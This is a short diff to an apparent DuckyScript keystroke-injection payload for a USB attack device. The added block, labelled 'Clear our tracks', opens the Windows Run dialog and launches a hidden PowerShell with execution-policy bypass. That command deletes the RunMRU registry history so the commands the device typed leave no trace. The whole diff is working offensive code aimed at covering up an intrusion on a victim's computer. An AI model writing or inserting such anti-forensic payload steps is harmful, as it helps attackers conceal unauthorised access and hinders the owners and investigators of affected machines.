@@ -103,3 +103,9 @@ REM *                     *
 REM * * * * * * * * * * * *
 REM
 ENTER
+REM
+REM Clear our tracks
+REM
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
